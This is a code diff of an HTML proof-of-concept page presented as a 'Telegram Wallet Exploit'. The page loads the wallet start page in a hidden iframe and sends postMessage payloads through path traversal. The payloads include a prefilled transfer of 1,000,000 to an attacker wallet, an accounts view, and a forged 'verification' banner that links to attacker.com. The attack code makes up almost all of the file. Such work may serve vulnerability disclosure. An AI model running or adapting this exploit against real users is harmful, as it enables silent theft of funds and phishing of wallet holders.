@@ -1,33 +1,39 @@
+
 <!DOCTYPE html>
 <html>
   <head>
-    <title>PoC Payload Tester</title>
+    <title>Telegram Wallet Exploit PoC</title>
   </head>
   <body>
-    <h1>PostMessage Payload Test</h1>
+    <h1>Telegram Wallet Exploit Demo</h1>
+    <p>This PoC shows how a background attacker page can silently trigger authenticated actions inside Telegram Wallet.</p>
 
-    <!-- Load actual Telegram WalletBot -->
+    <!-- Load Telegram Wallet Start Page in Hidden iframe -->
     <iframe id="tg_frame" src="https://t.me/wallet/start" style="display:none;"></iframe>
 
     <script>
       const payloads = [
-"../../../wallet/send?amount=9999999&to=attacker_user",
-"../../../wallet/ton-space",
-"../../../wallet/onboarding",
-"../../../wallet/debug",
-"../../../wallet/settings",
-"../../../wallet/accounts",
-"../../../wallet/address",
-"../../../wallet/transfer",
-"../../../wallet/alerts",
-"../../../wallet/start?banner=verify_phone&title=Security+Update"
+        // Prefilled TON transfer to attacker
+        "../../../wallet/send?amount=1000000&to=@attacker_wallet",
+
+        // Open accounts view (sensitive info)
+        "../../../wallet/accounts",
+
+        // Inject a fake banner with phishing URL
+        "../../../wallet/start?banner=verify_phone&title=Update+Required&text=Your+TON+Wallet+must+be+verified.+Click+here+to+secure+it.&url=https://attacker.com",
+
+        // Load TON Space
+        "../../../wallet/ton-space",
+
+        // Debug info (for dev interfaces)
+        "../../../wallet/debug"
       ];
 
       let index = 0;
 
       const sendPayload = () => {
         const testPayload = payloads[index];
-        console.log("🚀 Testing payload:", testPayload);
+        console.log("🚀 Sending payload:", testPayload);
 
         const message = JSON.stringify({
           eventType: 'web_app_open_tg_link',
@@ -46,7 +52,7 @@
 
         index++;
         if (index < payloads.length) {
-          setTimeout(sendPayload, 3000);
+          setTimeout(sendPayload, 2500); // Wait 2.5s between each
         }
       };
 
